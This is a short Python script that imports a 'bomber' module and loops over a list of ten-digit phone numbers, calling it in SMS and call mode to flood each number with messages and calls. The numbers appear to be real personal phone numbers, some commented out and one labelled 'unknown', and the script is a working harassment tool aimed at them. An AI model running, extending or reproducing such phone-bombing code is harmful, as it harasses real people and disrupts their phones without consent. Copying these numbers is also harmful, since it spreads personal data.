from bomber import selectnode
number = ['8825322511','7836876098','8292713417']
#number = ['9525461668']
#number = ['7541946701']
#number = ['8825322511']
number = ['9934824934']
#number = ['9263339399']
#number = ['8409560374']
#number = ['8935980850']
number = ['9525665157']# unknown
for i in number:
    selectnode(mode='sms', num=i)
    selectnode(mode='call', num=i)
